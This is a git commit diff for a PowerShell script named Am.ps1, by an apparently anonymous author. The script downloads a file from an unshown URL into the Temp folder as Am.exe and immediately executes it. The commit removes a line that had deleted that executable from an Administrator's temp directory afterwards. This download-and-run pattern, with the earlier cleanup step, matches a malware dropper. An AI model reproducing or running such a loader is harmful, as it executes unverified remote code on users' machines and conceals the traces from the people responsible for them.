0c5f6a6c7d126da44b4a2dd1f281beac73fd64aa
AnonAm93 <am9.9@outlook.com>
2024-10-05 15:52:00 -0700

    Update Am.ps1

--- Am.ps1
+++ Am.ps1
@@ -5,4 +5,3 @@ $outputFile = [System.IO.Path]::Combine($env:Temp, 'Am.exe')
 Start-Sleep -Milliseconds 100 
 Invoke-WebRequest -Uri $url -OutFile $outputFile
 Start-Process -FilePath $outputFile
-Remove-Item -LiteralPat C:\Users\Administrator\AppData\Local\Temp\2\Am.exe
